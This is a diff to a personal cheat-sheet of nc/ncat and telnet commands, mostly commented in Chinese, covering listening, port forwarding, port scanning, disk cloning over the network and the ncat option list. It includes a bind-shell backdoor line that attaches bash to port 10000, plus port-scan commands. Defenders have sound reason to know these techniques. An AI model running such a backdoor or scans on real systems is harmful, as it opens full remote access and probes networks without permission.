@@ -1,5 +1,9 @@
 #!/usr/bin/env bash
 
+### install
+sudo yum -y install net-tools
+sudo yum -y install telnet
+
 ## ncat [OPTIONS...] [hostname] [port]
 ## nc [OPTIONS...] [hostname] [port]
 # -4 强制nc只能使用IPv4地址。
@@ -37,8 +41,10 @@ telnet 192.168.1.1 25
 # 其它就是用CTRL +C或CTRL+D两种方式来强行断开与远程的连接，但能支持这种命令的比较少。
 # 最后的方法就是关掉telnet的窗口。
 
-## 监听本地端口
+
+### 监听本地端口
 nc -l -p 80   # 开启本机 80 端口 TCP 监听
+nc -k -lp 80   # 开启本机 80 端口 TCP 监听，Accept multiple connections in listen mode
 nc -l 5555    # macos
 nc -lk 5555    # -k 我们可以强制服务器保持连接并继续监听端口
 nc -l -p 80 > /tmp/log
@@ -64,12 +70,10 @@ until $(nc -zv 127.0.0.1 3306) == "*succeeded*"; do sleep 1; done;
 until nc -z 127.0.0.1 3306; do sleep 1; done;
 until nc -z 127.0.0.1 1234; do sleep 1; done;
 
-
 ## 代理，端口转发
 nc -l 8000                      # 在 192.168.0.102 上开端口 8000
 nc -l 9000 | nc localhost 8000  # 在 192.168.0.102 上开端口转发，从 9000 转发到 8000
 nc 192.168.0.102 9000           # 连接 192.168.0.102 上端口 9000
-
 
 ## 端口扫描
 nc -v -z -w2 192.168.0.3 1-100  # TCP端口扫描
@@ -84,10 +88,57 @@ nc -w 1 192.168.200.27 1234 < abc.txt
 nc -l -p 1234 | dd of=/dev/sda          # server2上进行类似的监听动作：
 dd if=/dev/sda | nc 192.168.200.27 1234 # server1上执行传输，即可完成从server1克隆sda硬盘到server2的任务：
 
-
 ## nc 命令还可以用来在系统中创建后门，并且这种技术也确实被黑客大量使用。
 # 为了保护我们的系统，我们需要知道它是怎么做的。 创建后门的命令为：
 ncat -l 10000 -e /bin/bash
 
 ## -e 标志将一个 bash 与端口 10000 相连。现在客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限：
 ncat 192.168.1.100 10000
+
+# Options taking a time assume seconds. Append 'ms' for milliseconds,
+# 's' for seconds, 'm' for minutes, or 'h' for hours (e.g. 500ms).
+  -4                         # Use IPv4 only
+  -6                         # Use IPv6 only
+  -U, --unixsock             # Use Unix domain sockets only
+  -C, --crlf                 # Use CRLF for EOL sequence
+  -c, --sh-exec <command>    # Executes the given command via /bin/sh
+  -e, --exec <command>       # Executes the given command
+      --lua-exec <filename>  # Executes the given Lua script
+  -g hop1[,hop2,...]         # Loose source routing hop points (8 max)
+  -G <n>                     # Loose source routing hop pointer (4, 8, 12, ...)
+  -m, --max-conns <n>        # Maximum <n> simultaneous connections
+  -h, --help                 # Display this help screen
+  -d, --delay <time>         # Wait between read/writes
+  -o, --output <filename>    # Dump session data to a file
+  -x, --hex-dump <filename>  # Dump session data as hex to a file
+  -i, --idle-timeout <time>  # Idle read/write timeout
+  -p, --source-port port     # Specify source port to use
+  -s, --source addr          # Specify source address to use (doesn't affect -l)
+  -l, --listen               # Bind and listen for incoming connections
+  -k, --keep-open            # Accept multiple connections in listen mode
+  -n, --nodns                # Do not resolve hostnames via DNS
+  -t, --telnet               # Answer Telnet negotiations
+  -u, --udp                  # Use UDP instead of default TCP
+      --sctp                 # Use SCTP instead of default TCP
+  -v, --verbose              # Set verbosity level (can be used several times)
+  -w, --wait <time>          # Connect timeout
+  -z                         # Zero-I/O mode, report connection status only
+      --append-output        # Append rather than clobber specified output files
+      --send-only            # Only send data, ignoring received; quit on EOF
+      --recv-only            # Only receive data, never send anything
+      --allow                # Allow only given hosts to connect to Ncat
+      --allowfile            # A file of hosts allowed to connect to Ncat
+      --deny                 # Deny given hosts from connecting to Ncat
+      --denyfile             # A file of hosts denied from connecting to Ncat
+      --broker               # Enable Ncat's connection brokering mode
+      --chat                 # Start a simple Ncat chat server
+      --proxy <addr[:port]>  # Specify address of host to proxy through
+      --proxy-type <type>    # Specify proxy type ("http" or "socks4" or "socks5")
+      --proxy-auth <auth>    # Authenticate with HTTP or SOCKS proxy server
+      --ssl                  # Connect or listen with SSL
+      --ssl-cert             # Specify SSL certificate file (PEM) for listening
+      --ssl-key              # Specify SSL private key (PEM) for listening
+      --ssl-verify           # Verify trust and domain name of certificates
+      --ssl-trustfile        # PEM file containing trusted SSL certificates
+      --ssl-ciphers          # Cipherlist containing SSL ciphers to use
+      --version              # Display Ncat's version information and exit
